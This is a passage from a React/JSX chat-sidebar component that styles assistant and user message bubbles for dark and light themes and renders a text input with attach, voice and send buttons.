                  msg.role === "assistant"
                    ? isDark
                      ? "bg-white/10 backdrop-blur-xl text-white border border-white/20"
                      : "bg-[#14A38F] text-white border border-[#14A38F]"
                    : isDark
                    ? "bg-black/60 backdrop-blur-xl text-white border border-white/20"
                    : "bg-blue-600/70 backdrop-blur-xl text-white border border-blue-300/40"
                } max-w-[85%] rounded-2xl px-4 py-3 shadow-sm whitespace-pre-wrap break-words leading-relaxed text-[15px]`}
              >
                {msg.role === "assistant" && idx === typingIndex && typedContent.length > 0
                  ? typedContent
                  : msg.content}
              </div>
            </div>
          ))}
        </div>

        {/* Input Area */}
        <div className="pt-4 border-t space-y-3">
          <div className={`flex items-center gap-2 ${isDark ? "bg-white/10 border-white/20" : "bg-white/60 border-gray-300/40"} backdrop-blur-xl rounded-xl border p-2 shadow-sm`}> 
            <button className={`p-2 rounded ${isDark ? "hover:bg-white/15" : "hover:bg-white"} shrink-0`} aria-label="Attach file">
              <Paperclip className={`h-5 w-5 ${isDark ? "text-white/80" : "text-gray-700"}`} />
            </button>
            <button className={`p-2 rounded ${isDark ? "hover:bg-white/15" : "hover:bg-white"} shrink-0`} aria-label="Voice input">
              <Mic className={`h-5 w-5 ${isDark ? "text-white/80" : "text-gray-700"}`} />
            </button>
            <input
              type="text"
              className={`flex-1 bg-transparent outline-none min-w-0 ${isDark ? "text-white placeholder-white/60" : "text-gray-900 placeholder-gray-600"}`}
              placeholder="Type..."
              value={text}
              onChange={(e) => setText(e.target.value)}
              onKeyDown={(e) => {
                if (e.key === "Enter" && text.trim()) {
                  onSend(text.trim());
                }
              }}
            />
            <button
              className={`flex items-center justify-center w-8 h-8 rounded-md ${
                isDark ? 'bg-white text-gray-900' : 'bg-[#14A38F] text-white'
              } disabled:opacity-50 shrink-0`}
              onClick={() => text.trim() && onSend(text.trim())}
              disabled={loading}
            >
              <Send className="h-4 w-4" />
            </button>
          </div>
        </div>
    </aside>
  );
};
